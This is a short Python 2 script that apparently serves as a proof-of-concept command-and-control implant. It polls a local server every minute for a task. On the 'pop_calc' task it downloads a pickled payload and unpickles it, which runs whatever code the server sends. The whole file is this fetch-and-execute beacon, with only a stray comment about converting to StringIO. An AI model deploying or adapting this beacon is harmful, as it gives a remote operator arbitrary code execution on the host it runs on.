import pickle
import urllib2
import StringIO
import time
from threading import Thread

def get_tasking():
    task = urllib2.urlopen("http://127.0.0.1:8000/tasking").read()
    if task.strip() == "pop_calc":
        Thread(target = execute_payload("pop_calc")).start()
        #execute_payload("pop_calc")
        return
    elif task == "wait":
        return 

def execute_payload(payload):
    pkl = urllib2.urlopen("http://127.0.0.1:8000/" + payload).read()
    
    # Pickle only works with file objects and stringIO. So, let's convert.
    pkl = StringIO.StringIO(pkl)
    pickle.load(pkl)
    pkl.close()
    
def main():
    while True:
        get_tasking()
        time.sleep(60)

if __name__ == '__main__':
    main()